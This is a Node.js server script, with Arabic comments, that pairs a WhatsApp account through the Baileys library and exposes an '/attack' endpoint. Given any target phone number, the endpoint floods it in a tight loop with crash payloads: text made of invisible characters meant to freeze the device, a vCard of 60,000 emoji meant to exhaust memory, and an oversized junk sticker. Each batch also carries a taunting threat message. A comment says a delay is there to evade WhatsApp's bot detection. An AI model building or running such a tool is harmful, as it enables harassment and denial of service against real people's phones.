const { default: makeWASocket, useMultiFileAuthState, delay, fetchLatestBaileysVersion, Browsers } = require("@whiskeysockets/baileys");
const express = require('express');
const cors = require('cors');
const pino = require('pino');
const fs = require('fs-extra');

const app = express();
app.use(cors());
const PORT = process.env.PORT || 10000;

let sock;
let isConnected = false;

// تنظيف الجلسة قبل كل محاولة ربط لضمان النجاح
async function cleanAuth() {
    try { await fs.remove('./auth_session'); } catch (e) {}
}

async function startWormGPT(phone = null, res = null) {
    const { state, saveCreds } = await useMultiFileAuthState('auth_session');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: Browsers.macOS('Desktop'),
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') isConnected = true;
        if (connection === 'close') isConnected = false;
    });

    if (phone && res) {
        await delay(15000); // تأخير ذكي لتخطي كاشف الروبوتات
        try {
            let code = await sock.requestPairingCode(phone.replace(/[^0-9]/g, ''));
            if (!res.headersSent) res.json({ code: code });
        } catch (err) {
            if (!res.headersSent) res.status(500).json({ error: "رفض واتساب الطلب، انتظر قليلاً" });
        }
    }
}

app.get('/get-code', async (req, res) => {
    const phone = req.query.phone;
    if (!phone) return res.status(400).send("رقم الهاتف مطلوب");
    await cleanAuth();
    startWormGPT(phone, res);
});

// --- قسم الهجوم النووي (Ultimate Crash) ---
app.get('/attack', async (req, res) => {
    const target = req.query.target + "@s.whatsapp.net";
    if (!isConnected) return res.status(500).json({ error: "اربط أولاً" });

    // قذيفة الـ VCard (الأقوى في تدمير الرام)
    const vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;" + "☣️".repeat(30000) + "\nFN:" + "🔥".repeat(30000) + "\nEND:VCARD";
    // قذيفة الرموز غير المرئية (تجميد المعالج)
    const ghost = ("҈".repeat(4000) + "‎".repeat(2000)).repeat(5);

    try {
        for (let i = 0; i < 60; i++) {
            // رسالة التهديد الخاصة بك
            await sock.sendMessage(target, { text: '*⬩➤ 𝑫𝑶𝑵𝑻 𝑷𝑳𝑨𝒀 𝑾𝑰𝑻𝑯 𝑵𝑨𝒁𝑰𝒀𝑨 一緒*\n*⬩➤ 𝑫𝑶𝑵𝑻 𝑷𝑳𝑨𝒀 𝑾𝑰𝑻𝑯 𝑲𝑰𝑹𝑨 一緒*\n*𝑺𝑯𝑨𝑵𝑲𝑺 𝑭𝑼𝑪𝑲𝑬𝑫 𝒀𝑶𝑼 𝑨𝑳𝑳✌︎*' });
            
            await sock.sendMessage(target, { text: ghost }); // تجميد
            await sock.sendMessage(target, { contacts: { displayName: 'FATAL ERROR', contacts: [{ vcard }] } }); // تدمير الرام
            await sock.sendMessage(target, { sticker: Buffer.alloc(1500000, "☢️") }); // قنبلة ستيكر
            
            await delay(300); // سرعة جلد قصوى
        }
        res.json({ success: true });
    } catch (e) { res.json({ error: "فشل الهجوم" }); }
});

app.listen(PORT, () => console.log(`🚀 السيرفر يعمل على المنفذ ${PORT}`));
      
